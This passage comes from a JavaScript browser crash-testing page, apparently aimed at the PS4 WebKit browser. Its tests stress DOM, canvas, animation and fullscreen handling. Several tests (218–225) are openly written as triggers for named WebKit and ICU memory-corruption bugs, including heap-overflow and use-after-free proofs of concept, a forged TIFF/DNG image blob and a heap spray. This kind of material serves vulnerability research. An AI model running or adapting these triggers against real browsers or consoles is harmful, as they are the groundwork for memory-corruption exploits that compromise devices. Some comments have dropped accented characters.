                    svg.appendChild(use);
                    lastId = use.id;
                }
            } catch(e) {
                addLog('Test 198 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 199: DOMNodeInsertedIntoDocument Event
        function test199_InsertIntoDocEvent() {
            addLog('TEST 199: DOMNodeInsertedIntoDocument handler');
            try {
                const div = document.createElement('div');
                div.addEventListener('DOMNodeInsertedIntoDocument', function() {
                    // Remove immediately upon insertion
                    if (div.parentNode) div.parentNode.removeChild(div);
                });
                testArea.appendChild(div);
            } catch(e) {
                addLog('Test 199 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 200: DOMAttrModified Remove
        function test200_AttrModifiedRemove() {
            addLog('TEST 200: Removing node during DOMAttrModified');
            try {
                const div = document.createElement('div');
                testArea.appendChild(div);
                
                div.addEventListener('DOMAttrModified', function() {
                    testArea.removeChild(div);
                });
                
                div.setAttribute('id', 'trigger');
            } catch(e) {
                addLog('Test 200 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 201: Table Header Scope Thrash
        function test201_TableScopeThrash() {
            addLog('TEST 201: Th/Td Scope attribute thrash');
            try {
                const table = document.createElement('table');
                const th = table.createTHead().insertRow().appendChild(document.createElement('th'));
                testArea.appendChild(table);
                
                const scopes = ['row', 'col', 'rowgroup', 'colgroup'];
                for(let i=0; i<100; i++) {
                    th.scope = scopes[i % scopes.length];
                }
            } catch(e) {
                addLog('Test 201 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 202: Canvas Pixel OOM
        function test202_CanvasPixelOOM() {
            addLog('TEST 202: Canvas getImageData Memory Pressure');
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 2000;
                canvas.height = 2000; // ~16MB
                const ctx = canvas.getContext('2d');
                
                // Allocation loop
                for(let i=0; i<10; i++) {
                    ctx.getImageData(0, 0, 2000, 2000);
                }
            } catch(e) {
                addLog('Test 202 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 203: Scroll Event Remove
        function test203_ScrollEventRemove() {
            addLog('TEST 203: Remove element inside scroll event');
            try {
                const div = document.createElement('div');
                div.style.overflow = 'scroll';
                div.style.height = '100px';
                div.innerHTML = '<div style="height:200px"></div>';
                testArea.appendChild(div);
                
                div.onscroll = function() {
                    testArea.removeChild(div);
                };
                
                div.scrollTop = 10;
            } catch(e) {
                addLog('Test 203 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 204: Focus Blur Chain
        function test204_FocusBlurChain() {
            addLog('TEST 204: Rapid Focus/Blur chain');
            try {
                const i1 = document.createElement('input');
                const i2 = document.createElement('input');
                testArea.appendChild(i1);
                testArea.appendChild(i2);
                
                for(let i=0; i<20; i++) {
                    i1.focus();
                    i2.focus(); // Causes i1 blur
                }
            } catch(e) {
                addLog('Test 204 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 205: Input List Attribute Swap
        function test205_InputListSwap() {
            addLog('TEST 205: Input list attribute mutation');
            try {
                const input = document.createElement('input');
                const dl1 = document.createElement('datalist');
                dl1.id = 'dl1';
                const dl2 = document.createElement('datalist');
                dl2.id = 'dl2';
                
                testArea.appendChild(input);
                testArea.appendChild(dl1);
                testArea.appendChild(dl2);
                
                for(let i=0; i<50; i++) {
                    input.setAttribute('list', i%2===0 ? 'dl1' : 'dl2');
                }
            } catch(e) {
                addLog('Test 205 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 206: Video Poster Race
        function test206_VideoPosterRace() {
            addLog('TEST 206: Video poster attribute race');
            try {
                const video = document.createElement('video');
                testArea.appendChild(video);
                
                for(let i=0; i<50; i++) {
                    video.poster = i%2===0 ? '' : 'about:blank';
                }
            } catch(e) {
                addLog('Test 206 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 207: Track Kind Switch
        function test207_TrackKindSwitch() {
            addLog('TEST 207: Track element kind switching');
            try {
                const track = document.createElement('track');
                const kinds = ['subtitles', 'captions', 'descriptions', 'chapters', 'metadata'];
                
                for(let i=0; i<50; i++) {
                    track.kind = kinds[i % kinds.length];
                }
            } catch(e) {
                addLog('Test 207 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 208: Form Target Frame Remove
        function test208_FormTargetRemove() {
            addLog('TEST 208: Submit form to iframe and remove iframe');
            try {
                const iframe = document.createElement('iframe');
                iframe.name = 'targetFrame';
                testArea.appendChild(iframe);
                
                const form = document.createElement('form');
                form.target = 'targetFrame';
                form.action = 'about:blank';
                testArea.appendChild(form);
                
                form.submit();
                testArea.removeChild(iframe); // Remove target immediately
            } catch(e) {
                addLog('Test 208 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 209: Select Options API
        function test209_SelectOptionsAPI() {
            addLog('TEST 209: Select options.add/remove API');
            try {
                const select = document.createElement('select');
                testArea.appendChild(select);
                
                for(let i=0; i<100; i++) {
                    const opt = document.createElement('option');
                    select.options.add(opt);
                    select.options.remove(0);
                }
            } catch(e) {
                addLog('Test 209 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 210: Textarea Selection Out of Bounds
        function test210_TextareaSelection() {
            addLog('TEST 210: Textarea setSelectionRange OOB');
            try {
                const ta = document.createElement('textarea');
                ta.value = 'abc';
                testArea.appendChild(ta);
                
                // Intentionally out of bounds
                ta.setSelectionRange(100, 200);
                ta.setSelectionRange(-1, -1);
            } catch(e) {
                addLog('Test 210 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 211: CSS Import Rule Race
        function test211_CSSImportRace() {
            addLog('TEST 211: CSS @import insertion race');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                const sheet = style.sheet;
                
                for(let i=0; i<20; i++) {
                    try {
                        sheet.insertRule('@import url("about:blank");', 0);
                        sheet.deleteRule(0);
                    } catch(err){}
                }
            } catch(e) {
                addLog('Test 211 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 212: SVG Filter Primitive Mutation
        function test212_SVGFilterPrimitive() {
            addLog('TEST 212: SVG Filter primitive add/remove');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const filter = document.createElementNS('http://www.w3.org/2000/svg', 'filter');
                svg.appendChild(filter);
                testArea.appendChild(svg);
                
                const blur = document.createElementNS('http://www.w3.org/2000/svg', 'feGaussianBlur');
                
                for(let i=0; i<50; i++) {
                    filter.appendChild(blur);
                    filter.removeChild(blur);
                }
            } catch(e) {
                addLog('Test 212 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 213: Canvas Composite Operation
        function test213_CanvasComposite() {
            addLog('TEST 213: Canvas globalCompositeOperation thrashing');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const ops = ['source-over', 'source-in', 'source-out', 'source-atop', 'destination-over', 'xor', 'copy'];
                
                for(let i=0; i<50; i++) {
                    ctx.globalCompositeOperation = ops[i % ops.length];
                    ctx.fillRect(0,0,10,10);
                }
            } catch(e) {
                addLog('Test 213 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 214: Node Contains Self Check
        function test214_NodeContainsSelf() {
            addLog('TEST 214: Node contains() on self/detached');
            try {
                const div = document.createElement('div');
                const child = document.createElement('span');
                div.appendChild(child);
                
                // Detached checks
                div.contains(child);
                div.contains(div);
                
                testArea.appendChild(div);
                testArea.removeChild(div);
                
                // Removed checks
                div.contains(child);
            } catch(e) {
                addLog('Test 214 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 215: TreeWalker PreviousNode
        function test215_TreeWalkerPrev() {
            addLog('TEST 215: TreeWalker previousNode() traversal');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<span>1</span><span>2</span><span>3</span>';
                testArea.appendChild(div);
                
                const walker = document.createTreeWalker(div, NodeFilter.SHOW_ELEMENT);
                walker.lastChild(); // Move to end
                
                while(walker.previousNode()) {
                    // Traverse backwards
                }
            } catch(e) {
                addLog('Test 215 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 216: Crypto Random Flood
        function test216_CryptoFlood() {
            addLog('TEST 216: Crypto getRandomValues flood');
            try {
                if (window.crypto) {
                    const arr = new Uint8Array(1024);
                    for(let i=0; i<100; i++) {
                        window.crypto.getRandomValues(arr);
                    }
                }
            } catch(e) {
                addLog('Test 216 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 217: FINAL CHAOS
        function test217_FinalChaos() {
            addLog('TEST 217: CHAOTIC DOM DESTRUCTION');
            try {
                // Populate
                for(let i=0; i<100; i++) testArea.appendChild(document.createElement('div'));
                
                const walker = document.createTreeWalker(testArea, NodeFilter.SHOW_ALL);
                let node;
                while(node = walker.nextNode()) {
                    if (Math.random() > 0.5 && node.parentNode) {
                        node.parentNode.removeChild(node);
                    } else {
                        node.textContent = Math.random();
                    }
                }
                testArea.innerHTML = 'CLEARED';
            } catch(e) {
                addLog('Test 217 Exception: ' + e.message, true);
                crashes++;
            }
        }
        // TEST 218: ICU Heap Buffer Overflow / OOM (CVE-2025-43429)
        // Tweaked for PS4 12.00
        function test218_ICUNormalizeOverflow() {
            addLog('TEST 218: String.prototype.normalize Heap Overflow/OOM');
            try {
                // Parmetros ajustados para o PS4 conforme PoC
                let len = 0x7FFFFFF0;
                let numExpandChars = 16;
                let fillLen = len - numExpandChars;
                
                let expandChar = "\u00A8";
                let fillChar = "a";
                let compatFactor = 0.626; // High memory pressure factor
                
                addLog('Allocating massive string...');
                
                // Construo da string maliciosa
                let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * compatFactor));
                
                addLog('Triggering normalize (This may freeze/crash)...');
                
                // O crash ocorre aqui
                let normalized = largeStr.normalize('NFKC');
                
                addLog('Normalization finished (No crash?)');
            } catch(e) {
                addLog('Test 218 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 219: WebCore::DOMWrapperWorld UAF (Worker Fonts)
        function test219_DOMWrapperWorldUAF() {
            addLog('TEST 219: DOMWrapperWorld UAF via Worker fonts');
            try {
                let workerBlob = `
                async function runTest() {
                    try {
                        var fontFaceSet = await self.fonts.ready;
                        fontFaceSet.onloadingdone = () => { };
                        postMessage("ready");
                    } catch(e) {}
                }
                runTest();
                `;
                
                let blobURL = self.URL.createObjectURL(new Blob([workerBlob], { type: 'text/javascript' }));
                let worker = new Worker(blobURL);
                
                worker.onmessage = () => {
                    // Race condition: Terminate worker while it holds references to font wrapper worlds
                    worker.terminate();
                    addLog('Worker terminated (Triggering UAF conditions)');
                    
                    // Cleanup attempt
                    setTimeout(() => {
                        self.URL.revokeObjectURL(blobURL);
                    }, 200);
                };
            } catch(e) {
                addLog('Test 219 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 220: WebCore RenderLayer ComputeCompositingRequirements UAF
        function test220_RenderLayerUAF() {
            addLog('TEST 220: RenderLayer UAF via Animation/SubtreeMod');
            try {
                // 1. Injetar CSS necessrio
                const style = document.createElement('style');
                style.textContent = `
                    @keyframes keyframes {}
                    cite { animation: keyframes 100ms infinite; }
                `;
                document.head.appendChild(style);

                // 2. Construir estrutura DOM
                const object = document.createElement('object');
                object.type = "image/png";
                
                const cite = document.createElement('cite');
                const dl = document.createElement('dl');
                dl.hidden = true;
                
                object.appendChild(cite);
                object.appendChild(dl);
                testArea.appendChild(object);

                // 3. Handler do Exploit
                function subtreeModified() {
                    try {
                        const animation = cite.getAnimations()[0];
                        if (animation) {
                            object.width = "1em";
                            // Acesso crtico para triggerar o clculo de camadas
                            const temp = object.codeBase; 
                            animation.effect = new KeyframeEffect(dl, { });
                        }
                    } catch(err) {
                        console.log(err);
                    }
                }

                // 4. Armar gatilho
                object.addEventListener("DOMSubtreeModified", subtreeModified);
                
                // 5. Disparar
                object.data = "x";
                
                // Cleanup style aps execuo (se no crashar)
                setTimeout(() => {
                    if(document.head.contains(style)) document.head.removeChild(style);
                }, 1000);

            } catch(e) {
                addLog('Test 220 Exception: ' + e.message, true);
                crashes++;
            }
        }
        // TEST 221: DNG Image Processing Memory Corruption (CVE-2025-43300)
        // Tenta carregar um Blob com cabealho TIFF/DNG forjado para triggar o parser de imagem
        function test221_DNGImageCrash() {
            addLog('TEST 221: Attempting Malformed DNG Image Load');
            try {
                // Header TIFF/DNG bsico (Little Endian) + Lixo para causar OOB Read/Write
                // 49 49 2A 00 (TIFF Header)
                const header = new Uint8Array([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00]); 
                const junk = new Uint8Array(1024 * 1024); // 1MB de lixo
                for(let i=0; i<junk.length; i++) junk[i] = Math.random() * 255;
                
                const blob = new Blob([header, junk], {type: 'image/tiff'}); // DNG  baseado em TIFF
                const url = URL.createObjectURL(blob);
                
                const img = document.createElement('img');
                testArea.appendChild(img);
                
                img.onload = () => URL.revokeObjectURL(url);
                img.onerror = () => {
                    addLog('Image load failed (Expected if format not parsed, but might crash kernel if parsed)');
                    URL.revokeObjectURL(url);
                };
                
                // Fora o navegador a tentar decodificar como imagem
                img.src = url;
            } catch(e) {
                addLog('Test 221 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 222: WebKit Heap UAF in RenderLayer (via content-visibility)
        // O texto menciona explicitamente "CSS content-visibility and DOM removals"
        function test222_ContentVisibilityUAF() {
            addLog('TEST 222: content-visibility + DOM Removal UAF');
            try {
                const container = document.createElement('div');
                const child = document.createElement('div');
                child.innerHTML = '<b>Layer Content</b><p>More Content</p>';
                // Estilo para forar criao de RenderLayer
                child.style.cssText = 'contain: content; width: 100px; height: 100px; background: red;';
                
                container.appendChild(child);
                testArea.appendChild(container);
                
                // Loop rpido alternando visibilidade e removendo ns
                let count = 0;
                const i = setInterval(() => {
                    if (count++ > 50) { clearInterval(i); return; }
                    
                    // 1. Oculta contedo (otimizao de layer)
                    child.style.contentVisibility = 'hidden';
                    
                    // 2. Fora reflow parcial
                    container.offsetWidth;
                    
                    // 3. Remove contedo interno enquanto oculto
                    child.innerHTML = '';
                    
                    // 4. Restaura visibilidade (Tenta pintar layer com contedo removido)
                    child.style.contentVisibility = 'visible';
                    child.innerHTML = '<b>Respawn</b>';
                }, 10);
            } catch(e) {
                addLog('Test 222 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 223: Exiting Fullscreen During Heap-Spray
        // O texto cita crash ao entrar/sair de fullscreen DURANTE heap spray
        function test223_FullscreenSprayRace() {
            addLog('TEST 223: Fullscreen Toggle + Heap Spray');
            try {
                const div = document.createElement('div');
                div.style.background = 'blue';
                div.textContent = 'Fullscreen Spray Target';
                testArea.appendChild(div);
                
                // 1. Inicia Heap Spray Assncrono
                let spray = [];
                const sprayer = setInterval(() => {
                    const arr = new Uint32Array(0x10000);
                    for(let i=0; i<arr.length; i++) arr[i] = 0x41414141;
                    spray.push(arr);
                    if (spray.length > 500) spray = []; // Evita OOM total, foca na atividade de alocao
                }, 5);
                
                // 2. Tenta entrar e sair de fullscreen rapidamente
                if (div.webkitRequestFullscreen) {
                    div.webkitRequestFullscreen();
                    
                    setTimeout(() => {
                        if (document.webkitExitFullscreen) {
                            document.webkitExitFullscreen();
                        }
                        clearInterval(sprayer);
                    }, 200); // Janela de tempo crtica mencionada no report
                } else {
                    addLog('Fullscreen API not available, skipping toggle');
                    clearInterval(sprayer);
                }
            } catch(e) {
                addLog('Test 223 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 224: Bug in WebCore::CSSAnimation
        // Foca em instabilidade durante contedo animado
        function test224_AnimationDestructor() {
            addLog('TEST 224: CSS Animation + Stylesheet Destruio');
            try {
                const style = document.createElement('style');
                style.textContent = `
                    @keyframes crash { 0% { opacity: 1; transform: scale(1); } 100% { opacity: 0; transform: scale(0); } }
                    .anim { animation: crash 0.1s infinite; }
                `;
                document.head.appendChild(style);
                
                const div = document.createElement('div');
                div.className = 'anim';
                div.textContent = 'Animating...';
                testArea.appendChild(div);
                
                div.addEventListener('animationstart', () => {
                    // Remove o stylesheet que define a animao DURANTE o evento de incio
                    // Isso pode confundir o WebCore AnimationController
                    if (style.parentNode) style.parentNode.removeChild(style);
                    testArea.removeChild(div);
                });
                
                // Fora incio
                div.style.display = 'none';
                div.offsetHeight;
                div.style.display = 'block';
            } catch(e) {
                addLog('Test 224 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 225: Unknown Heap and String Overflow (Rope Attack)
        // O texto cita "Overflow in string handling". Tentaremos criar strings "Rope" (concatenadas) massivas
        function test225_RopeStringOverflow() {
            addLog('TEST 225: Recursive String Concatenation (Rope Overflow)');
            try {
                let s = "A";
                // Crescimento exponencial para testar limites de alocao de String no JSC
                for (let i = 0; i < 28; i++) {
                    s += s; // Cria ConsString (Rope) internamente no WebKit
                }
                
                // Tenta forar a "flattening" da string (converso de Rope para vetor contguo)
                // Isso muitas vezes trigga OOM ou Overflow se o clculo de tamanho falhar
                const sub = s.substring(s.length - 100);
                const div = document.createElement('div');
                
                // Atribui ao DOM para forar processamento
                div.className = sub; 
                testArea.appendChild(div);
                addLog('String length created: ' + s.length);
            } catch(e) {
                addLog('Test 225 Exception (Likely OOM): ' + e.message, true);
                crashes++;
            }
        }
        // TEST 226: Violent Teardown during Fullscreen Transition
        function test226_FullscreenTeardown() {
            addLog('TEST 226: Clearing DOM during webkitfullscreenchange');
            try {
                const target = document.createElement("div");
                target.style.height = "200vh";
                target.style.background = "red";
                testArea.appendChild(target);

                const handler = () => {
                    // Teardown violento durante transio
                    // Usamos testArea.innerHTML para no apagar a ferramenta inteira, 
                    // mas o efeito no renderizador  similar.
                    testArea.innerHTML = "";
                    const p = document.createElement('p');
                    p.textContent = "DOM REMOVED";
                    testArea.appendChild(p);
                    document.removeEventListener("webkitfullscreenchange", handler);
                };

                document.addEventListener("webkitfullscreenchange", handler, { once: true });

                if (target.webkitRequestFullscreen) {
                    target.webkitRequestFullscreen();
                } else {
                    addLog('Fullscreen API not supported');
                }
            } catch(e) {
                addLog('Test 226 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 227: Fullscreen Enter/Exit Race
        function test227_FullscreenRace() {
            addLog('TEST 227: Fullscreen Request/Exit Race (0ms)');
            try {
                const el = document.createElement('div');
                el.style.background = 'blue';
                testArea.appendChild(el);

                if (el.webkitRequestFullscreen) {
                    el.webkitRequestFullscreen();

                    // Sada imediata (race condition)
                    setTimeout(() => {
                        if (document.webkitExitFullscreen) {
                            document.webkitExitFullscreen();
                        }
                    }, 0);
                }
            } catch(e) {
                addLog('Test 227 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 228: Animation Removal during Render
        function test228_AnimationRemoval() {
            addLog('TEST 228: Removing animated node during render');
            try {
                // Injetar CSS
                const style = document.createElement('style');
                style.textContent = `
                    @keyframes spin228 { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
                    .box228 {
                        width: 100px;
                        height: 100px;
                        background: blue;
                        animation: spin228 0.2s infinite linear;
                    }
                `;
                document.head.appendChild(style);

                const box = document.createElement('div');
                box.className = 'box228';
                testArea.appendChild(box);

                setTimeout(() => {
                    // Remover n animado em pleno render
                    box.remove();
                    // Limpar estilo
                    document.head.removeChild(style);
                    addLog('Animated node removed');
                }, 50);
            } catch(e) {
                addLog('Test 228 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 229: Canvas Context Use-After-Free
        function test229_CanvasContextUAF() {
            addLog('TEST 229: Canvas removal + Context access');
            try {
                const c = document.createElement("canvas");
                c.width = 256;
                c.height = 256;
                testArea.appendChild(c);
                
                const ctx = c.getContext("2d");
                ctx.fillRect(0,0,256,256);

                // Remover canvas
                c.remove();

                // Usar contexto depois (UAF attempt)
                setTimeout(() => {
                    try {
                        ctx.getImageData(0,0,10,10);
                        addLog('getImageData called on removed canvas ctx');
                    } catch(e) {
                        addLog('Context access failed (handled): ' + e.message);
                    }
                }, 50);
            } catch(e) {
                addLog('Test 229 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 230: Content-Visibility Auto Removal
        function test230_ContentVisibilityRemove() {
            addLog('TEST 230: content-visibility: auto + removal');
            try {
                const el = document.createElement("div");
                el.style.contentVisibility = "auto";
                el.style.height = "2000px";
                el.style.background = "green";
                el.textContent = "BIG CONTENT";
                testArea.appendChild(el);

                setTimeout(() => {
                    el.remove();
                    addLog('content-visibility element removed');
                }, 50);
            } catch(e) {
                addLog('Test 230 Exception: ' + e.message, true);
                crashes++;
            }
        }

    </script>
</body>
</html>
